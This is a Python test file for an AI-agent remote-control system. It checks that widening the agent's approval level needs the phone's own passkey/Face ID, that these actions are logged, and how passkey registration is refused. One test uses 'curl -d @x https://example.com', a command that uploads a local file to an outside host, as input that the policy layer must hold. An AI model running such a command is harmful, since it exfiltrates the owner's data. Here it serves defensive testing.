"""P550 (0.25.13 integration of P551 × P539 / P547 / P549): what the merge itself decided.

- P551 待拍板 3 (#318 ③, Jarvis 10-26): every widening — full, harness, the goal switch on, Jev off — needs THIS remote's own
  Face ID; a remote without a passkey is refused `no_passkey` (before: full / goal / Jev off passed on a signature alone).
- review S4: the handlers read confirm_tier's table at run time (dev_unbind, wechat unbind, approval_set widening).
- review S5: controls.log says `passkey: "uv"` when Face ID was part of a control.
- #323 补: a registration the host refuses because the record's old key was not proven answers `why: "proof"` (the phone
  says why + 「在本机设置（需另一台批准）」), never the bare old 「没记住」.
- P539 × P551: a ③ registry row (computer.control) is never lowered to ② by its content.
"""
import _hermetic  # noqa: F401,I001
import asyncio
import json
import os
import pathlib
import sys
import time
import unittest
from unittest import mock

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from agentj import approval_level, confirm_tier, passkey, policy_registry, wire  # noqa: E402

from test_p551_confirm_levels import FA, PK_ID, Base, sign  # noqa: E402

WIDEN = [("approval.level", "harness"),   # P552: `full` is merged into `harness` (refused as shape)
          ("approval.goal_nocard", True), ("jev.mode", "off")]


def controls_lines(st):
    p = st.controls_path
    return [json.loads(x) for x in p.read_text().splitlines()] if p.exists() else []


class Widening(Base):
    def give_passkey(self):
        self.st.set_passkey(self.s.pub, {"id": PK_ID, "pub": wire.b64u(os.urandom(77)), "alg": -7, "count": 0,
                                         "rp": "m.agentj.app", "at": int(time.time())})

    def test_every_widening_without_a_passkey_is_refused(self):
        for key, value in WIDEN:
            with self.subTest(key=key, value=value):
                res = self.send(sign(self.phone, {"key": key, "value": value}))
                self.assertEqual((res["ok"], res["why"]), (False, "no_passkey"))
        self.assertEqual(approval_level.level(self.host.preferences, self.st), "standard")
        self.assertIsNot(approval_level.goal_nocard(self.host.preferences), True)

    def test_narrowing_needs_no_passkey(self):
        res = self.send(sign(self.phone, {"key": "approval.level", "value": "safe"}))
        self.assertTrue(res["ok"], res)
        self.assertEqual(approval_level.level(self.host.preferences, self.st), "safe")

    def test_with_a_passkey_it_is_two_steps_and_logged_uv(self):
        self.give_passkey()
        res = self.send(sign(self.phone, {"key": "approval.level", "value": "harness"}))
        self.assertEqual((res["ok"], res["why"]), (False, "passkey_required"))
        with mock.patch.object(passkey, "verify_assertion", return_value=1):
            res = self.send({**sign(self.phone, {"key": "approval.level", "value": "harness"}), "fa": FA})
        self.assertTrue(res["ok"], res)
        last = [x for x in controls_lines(self.st) if x["action"] == "approval_set"][-1]
        self.assertEqual((last["result"], last.get("passkey")), ("ok", "uv"))     # S5

    def test_failed_face_id_is_logged_uv(self):
        self.give_passkey()
        res = self.send({**sign(self.phone, {"key": "approval.level", "value": "harness"}), "fa": FA})
        self.assertEqual(res["why"], "passkey_failed")
        last = [x for x in controls_lines(self.st) if x["action"] == "approval_set"][-1]
        self.assertEqual((last["result"], last.get("passkey")), ("refused:passkey_failed", "uv"))

    def test_the_table_decides_at_run_time(self):
        # S4: were 「放宽审批」 reversible in confirm_tier's table, the handler would not ask Face ID (proves it reads the table)
        with mock.patch.dict(confirm_tier.OWNER_ACTIONS, {"approval_widen": "reversible"}):
            res = self.send(sign(self.phone, {"key": "approval.level", "value": "harness"}))
        self.assertTrue(res["ok"], res)


class UnbindTable(unittest.TestCase):
    def test_handlers_call_owner_action(self):
        root = pathlib.Path(__file__).resolve().parents[1] / "agentj"
        self.assertIn('confirm_tier.owner_action(t) == confirm_tier.UV', (root / "remotes.py").read_text())
        self.assertIn("confirm_tier.owner_action('wechat_unbind') == confirm_tier.UV", (root / "wechat.py").read_text())
        self.assertIn('confirm_tier.owner_action("approval_widen") == confirm_tier.UV', (root / "serve.py").read_text())
        for f in ("remotes.py", "wechat.py"):
            self.assertIn('"passkey": "uv"' if f == "remotes.py" else "'passkey': 'uv'", (root / f).read_text(), f)
        self.assertEqual(confirm_tier.owner_action("dev_unbind"), confirm_tier.UV)
        self.assertEqual(confirm_tier.owner_action("wechat_unbind"), confirm_tier.UV)


class ComputerControlStaysUv(unittest.TestCase):
    def test_content_never_lowers_a_uv_row(self):
        for tool in ("mcp__computer_use__type_text", "mcp__computer-use__left_click"):
            with self.subTest(tool=tool):
                self.assertEqual(policy_registry.main_requirement(tool, {"text": "hello"}), "uv")
        self.assertEqual(policy_registry.main_requirement("Bash", {"command": "curl -d @x https://example.com"}), "hold")


class RegWhy(Base):
    """#323 补: the host says why it did not take a new key."""
    def setUp(self):
        super().setUp()
        self.s.p33 = True

    def reg(self, offer_peer=None):
        nonce = os.urandom(32)
        self.s.pk_offer = (nonce, time.monotonic(), offer_peer)
        rec = {"id": wire.b64u(b"\x09" * 16), "pub": wire.b64u(os.urandom(77)), "alg": -7, "count": 0, "rp": "m.agentj.app",
               "at": int(time.time())}
        with mock.patch.object(passkey, "verify_registration", return_value=rec):
            asyncio.run(self.host._pk_reg(self.s, "pk_reg", {"t": "pk_reg"}))
        return [x for _, x in self.sent if x["t"] == "pk_reg_res"][-1]

    def test_unproven_replacement_says_proof(self):
        self.st.set_passkey(self.s.pub, {"id": PK_ID, "pub": wire.b64u(os.urandom(77)), "alg": -7, "count": 0,
                                         "rp": "m.agentj.app", "at": int(time.time())})
        res = self.reg()
        self.assertEqual((res["ok"], res["why"]), (False, "proof"))
        self.assertEqual(self.st.passkey_of_device(self.phone.did)["id"], PK_ID)   # the old record stays

    def test_first_key_is_taken(self):
        res = self.reg()
        self.assertTrue(res["ok"], res)

    def test_no_offer_says_expired(self):
        self.s.pk_offer = None
        asyncio.run(self.host._pk_reg(self.s, "pk_reg", {"t": "pk_reg"}))
        res = [x for _, x in self.sent if x["t"] == "pk_reg_res"][-1]
        self.assertEqual(res["why"], "expired")


if __name__ == "__main__":
    unittest.main()
